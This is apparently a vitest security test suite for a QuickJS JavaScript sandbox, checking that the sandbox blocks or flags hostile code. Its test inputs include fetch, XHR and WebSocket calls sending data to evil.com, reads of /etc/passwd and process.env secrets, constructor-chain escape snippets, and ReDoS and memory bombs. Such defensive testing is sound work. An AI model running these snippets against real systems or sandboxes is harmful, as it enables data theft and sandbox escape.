/**
 * @fileoverview Comprehensive security tests for the sandbox system
 * 
 * These tests validate the security boundaries, escape prevention,
 * and malicious code handling capabilities of the sandbox system.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  QuickJSSandbox,
  createProductionSandbox,
  createResearchSandbox,
  SandboxSecurityError,
  SandboxTimeoutError,
  SandboxMemoryError,
  analyzeSandboxResult,
  type SandboxPolicy,
} from '../../src/sandbox/index.js';

describe('Sandbox Security Tests', () => {
  let sandbox: QuickJSSandbox;

  afterEach(async () => {
    if (sandbox) {
      await sandbox.cleanup();
    }
  });

  describe('Network Access Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should block XMLHttpRequest', async () => {
      const code = `
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://evil.com/steal-data');
        xhr.send();
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations).toHaveLength(1);
      expect(result.securityViolations[0].type).toBe('api_access');
      expect(result.securityViolations[0].severity).toBe('critical');
    });

    it('should block fetch API', async () => {
      const code = `
        fetch('https://evil.com/exfiltrate', {
          method: 'POST',
          body: JSON.stringify({ data: 'stolen' })
        });
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'api_access')).toBe(true);
    });

    it('should block WebSocket connections', async () => {
      const code = `
        const ws = new WebSocket('wss://evil.com/backdoor');
        ws.onopen = () => ws.send('compromised');
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'network_access')).toBe(true);
    });

    it('should block EventSource', async () => {
      const code = `
        const source = new EventSource('https://evil.com/stream');
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'network_access')).toBe(true);
    });
  });

  describe('Code Injection Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should detect and monitor eval usage', async () => {
      const code = `
        const maliciousCode = "console.log('injected code')";
        eval(maliciousCode);
      `;

      const result = await sandbox.execute(code);
      
      // Code should be intercepted and analyzed
      expect(result.sideEffects.some(se => se.type === 'eval_call')).toBe(true);
      expect(result.trace.entries.some(entry => 
        entry.data.operation.includes('eval')
      )).toBe(true);
    });

    it('should detect Function constructor usage', async () => {
      const code = `
        const func = new Function('return "dynamically created"');
        func();
      `;

      const result = await sandbox.execute(code);
      
      expect(result.sideEffects.some(se => se.type === 'function_creation')).toBe(true);
    });

    it('should block string-based setTimeout', async () => {
      const code = `
        setTimeout("console.log('delayed injection')", 100);
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'eval_usage')).toBe(true);
    });

    it('should block string-based setInterval', async () => {
      const code = `
        setInterval("console.log('recurring injection')", 100);
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });
  });

  describe('Prototype Pollution Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should prevent Object.prototype pollution', async () => {
      const code = `
        Object.prototype.polluted = 'yes';
        const obj = {};
        return obj.polluted;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'prototype_pollution')).toBe(true);
    });

    it('should prevent Array.prototype pollution', async () => {
      const code = `
        Array.prototype.polluted = 'yes';
        const arr = [];
        return arr.polluted;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });

    it('should prevent Function.prototype pollution', async () => {
      const code = `
        Function.prototype.polluted = 'yes';
        function test() {}
        return test.polluted;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });
  });

  describe('Constructor Manipulation Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should prevent constructor chain exploitation', async () => {
      const code = `
        const obj = {};
        const constructor = obj.constructor.constructor;
        return constructor('return process')();
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => 
        v.type === 'code_injection' || v.message.includes('constructor')
      )).toBe(true);
    });

    it('should prevent Array constructor manipulation', async () => {
      const code = `
        [].constructor.constructor('return this')().process;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });

    it('should prevent String constructor manipulation', async () => {
      const code = `
        ''.constructor.constructor('return global')();
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox({
        maxMemoryMB: 32,
        maxExecutionTimeMS: 1000,
        maxLoopIterations: 1000,
      });
      await sandbox.initialize();
    });

    it('should prevent memory exhaustion attacks', async () => {
      const code = `
        const bigArray = [];
        for (let i = 0; i < 1000000; i++) {
          bigArray.push(new Array(1000).fill('a'.repeat(1000)));
        }
        return bigArray.length;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'memory_limit')).toBe(true);
    });

    it('should prevent infinite loop attacks', async () => {
      const code = `
        let count = 0;
        while (true) {
          count++;
          if (count > 1000000) break; // This should never be reached
        }
        return count;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(
        result.securityViolations.some(v => v.type === 'infinite_loop') ||
        result.securityViolations.some(v => v.type === 'timeout')
      ).toBe(true);
    });

    it('should prevent stack overflow attacks', async () => {
      const code = `
        function overflow(n) {
          if (n <= 0) return n;
          return overflow(n - 1) + overflow(n - 2);
        }
        return overflow(1000);
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'stack_overflow')).toBe(true);
    });

    it('should prevent ReDoS attacks', async () => {
      const code = `
        const maliciousRegex = /(a+)+$/;
        const input = 'a'.repeat(1000) + 'b';
        return maliciousRegex.test(input);
      `;

      const result = await sandbox.execute(code);
      
      // Should timeout due to catastrophic backtracking
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'timeout')).toBe(true);
    });
  });

  describe('File System Access Prevention', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should block require() calls', async () => {
      const code = `
        const fs = require('fs');
        return fs.readFileSync('/etc/passwd', 'utf8');
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'api_access')).toBe(true);
    });

    it('should block access to process object', async () => {
      const code = `
        return process.env.SECRET_KEY;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.securityViolations.some(v => v.type === 'api_access')).toBe(true);
    });

    it('should block access to __dirname and __filename', async () => {
      const code = `
        return __dirname + __filename;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
    });
  });

  describe('Malicious Sample Validation', () => {
    beforeEach(async () => {
      sandbox = createResearchSandbox(); // Slightly more permissive for analysis
      await sandbox.initialize();
    });

    it('should safely handle hex-encoded obfuscated code', async () => {
      const code = `
        const encoded = '\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x2e\\x6c\\x6f\\x67';
        const decoded = encoded.replace(/\\\\x([0-9a-f]{2})/gi, (match, hex) => 
          String.fromCharCode(parseInt(hex, 16))
        );
        eval(decoded + "('decoded message')");
      `;

      const result = await sandbox.execute(code);
      
      // Should detect the encoding pattern and eval usage
      expect(result.trace.decodedStrings.length).toBeGreaterThan(0);
      expect(result.sideEffects.some(se => se.type === 'eval_call')).toBe(true);
      
      const analysis = analyzeSandboxResult(result);
      expect(analysis.obfuscationLevel).toBeGreaterThan(20);
    });

    it('should handle base64 encoded payloads', async () => {
      const code = `
        const payload = 'Y29uc29sZS5sb2coImJhc2U2NCBkZWNvZGVkIik=';
        const decoded = atob ? atob(payload) : 
          Buffer.from(payload, 'base64').toString();
        eval(decoded);
      `;

      const result = await sandbox.execute(code);
      
      expect(result.sideEffects.some(se => se.type === 'eval_call')).toBe(true);
      
      const analysis = analyzeSandboxResult(result);
      expect(analysis.deobfuscationOpportunities.length).toBeGreaterThan(0);
    });

    it('should detect and analyze string array deobfuscation', async () => {
      const code = `
        const strings = ['hello', 'world', 'from', 'obfuscated', 'code'];
        const indices = [0, 1, 2, 3, 4];
        let result = '';
        for (let i = 0; i < indices.length; i++) {
          result += strings[indices[i]] + ' ';
        }
        console.log(result);
        return result;
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(true);
      expect(result.trace.stats.totalStringOperations).toBeGreaterThan(0);
      expect(result.trace.constants.size).toBeGreaterThan(0);
      
      const analysis = analyzeSandboxResult(result);
      expect(analysis.obfuscationLevel).toBeGreaterThan(0);
    });

    it('should handle complex nested obfuscation', async () => {
      const code = `
        (function() {
          const a = ["log", "console"];
          const b = {};
          b[a[1]] = {};
          b[a[1]][a[0]] = function(msg) { return msg; };
          
          const c = ["\\x48", "\\x65", "\\x6c", "\\x6c", "\\x6f"];
          let d = "";
          for (let i = 0; i < c.length; i++) {
            d += String.fromCharCode(parseInt(c[i].slice(2), 16));
          }
          
          return b[a[1]][a[0]](d);
        })();
      `;

      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(true);
      
      const analysis = analyzeSandboxResult(result);
      expect(analysis.obfuscationLevel).toBeGreaterThan(30);
      expect(analysis.deobfuscationOpportunities.length).toBeGreaterThan(0);
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should handle large code inputs gracefully', async () => {
      sandbox = createProductionSandbox({
        maxExecutionTimeMS: 2000,
      });
      await sandbox.initialize();

      const largeCode = 'const x = 1;\n'.repeat(10000) + 'return x;';
      
      const result = await sandbox.execute(largeCode);
      
      // Should either succeed quickly or fail with reasonable error
      expect(result.executionTimeMs).toBeLessThan(2000);
      if (!result.success) {
        expect(result.securityViolations.some(v => 
          v.type === 'timeout' || v.type === 'memory_limit'
        )).toBe(true);
      }
    });

    it('should prevent zip bombs through string concatenation', async () => {
      sandbox = createProductionSandbox({
        maxMemoryMB: 16,
        maxExecutionTimeMS: 1000,
      });
      await sandbox.initialize();

      const code = `
        let bomb = 'A';
        for (let i = 0; i < 25; i++) {
          bomb += bomb; // Exponential growth
        }
        return bomb.length;
      `;
      
      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(
        result.securityViolations.some(v => v.type === 'memory_limit') ||
        result.securityViolations.some(v => v.type === 'timeout')
      ).toBe(true);
    });
  });

  describe('Execution Context Isolation', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should isolate global variable access', async () => {
      const code1 = 'globalThis.maliciousData = "compromised";';
      const code2 = 'return globalThis.maliciousData;';
      
      await sandbox.execute(code1);
      const result = await sandbox.execute(code2);
      
      // Should not persist data between executions in production mode
      expect(result.value).toBeUndefined();
    });

    it('should prevent cross-execution contamination', async () => {
      const code1 = `
        Object.prototype.contaminated = true;
        return 'first';
      `;
      
      const code2 = `
        const obj = {};
        return obj.contaminated ? 'contaminated' : 'clean';
      `;
      
      await sandbox.execute(code1); // Should fail
      const result2 = await sandbox.execute(code2);
      
      expect(result2.value).toBe('clean');
    });
  });

  describe('Edge Cases and Error Handling', () => {
    beforeEach(async () => {
      sandbox = createProductionSandbox();
      await sandbox.initialize();
    });

    it('should handle syntax errors gracefully', async () => {
      const code = 'this is not valid javascript syntax !!!';
      
      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.executionTimeMs).toBeLessThan(100);
    });

    it('should handle runtime errors gracefully', async () => {
      const code = `
        function throwError() {
          throw new Error('Runtime error for testing');
        }
        throwError();
      `;
      
      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Runtime error for testing');
    });

    it('should handle empty code', async () => {
      const result = await sandbox.execute('');
      
      expect(result.success).toBe(true);
      expect(result.value).toBeUndefined();
    });

    it('should handle null and undefined values', async () => {
      const code = `
        const values = [null, undefined, 0, false, ''];
        return values.map(v => typeof v);
      `;
      
      const result = await sandbox.execute(code);
      
      expect(result.success).toBe(true);
      expect(result.value).toEqual(['object', 'undefined', 'number', 'boolean', 'string']);
    });
  });

  describe('Security Analysis Integration', () => {
    it('should provide comprehensive security analysis', async () => {
      sandbox = createResearchSandbox();
      await sandbox.initialize();

      const code = `
        // Obfuscated code with multiple techniques
        const a = ["eval", "console", "log"];
        const b = String.fromCharCode(99, 111, 110, 115, 111, 108, 101);
        const c = "\\x6c\\x6f\\x67";
        
        // Dynamic string building
        let cmd = "";
        for (let i = 0; i < b.length; i++) {
          cmd += b[i];
        }
        cmd += "." + c.replace(/\\\\x([0-9a-f]{2})/g, (m, h) => 
          String.fromCharCode(parseInt(h, 16))
        );
        
        // Dynamic evaluation
        return eval(cmd + "('analysis test')");
      `;

      const result = await sandbox.execute(code);
      const analysis = analyzeSandboxResult(result);
      
      expect(analysis.obfuscationLevel).toBeGreaterThan(50);
      expect(analysis.deobfuscationOpportunities).toContain(
        expect.stringMatching(/string.*decod|constant.*extract|dynamic.*code/i)
      );
      expect(analysis.executionSummary.dynamicCodeGeneration).toBeGreaterThan(0);
      expect(analysis.executionSummary.stringOperations).toBeGreaterThan(0);
    });

    it('should identify deobfuscation opportunities', async () => {
      sandbox = createResearchSandbox();
      await sandbox.initialize();

      const code = `
        const encoded = ['72', '101', '108', '108', '111'];
        const decoded = encoded.map(x => String.fromCharCode(parseInt(x)));
        const result = decoded.join('');
        console.log(result);
        return result;
      `;

      const result = await sandbox.execute(code);
      const analysis = analyzeSandboxResult(result);
      
      expect(analysis.deobfuscationOpportunities.length).toBeGreaterThan(0);
      expect(result.trace.constants.size).toBeGreaterThan(0);
    });
  });
});
